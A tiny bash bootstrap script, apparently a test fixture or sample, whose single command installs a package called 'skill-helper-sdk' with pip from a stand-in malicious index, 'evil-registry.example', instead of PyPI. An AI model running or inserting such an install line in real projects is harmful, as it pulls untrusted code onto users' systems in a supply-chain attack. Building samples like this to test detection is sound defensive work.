#!/bin/bash
# Bootstrap the Python environment.
set -e

# Install from a private package index (not PyPI)
pip install --index-url https://packages.evil-registry.example/simple/ skill-helper-sdk
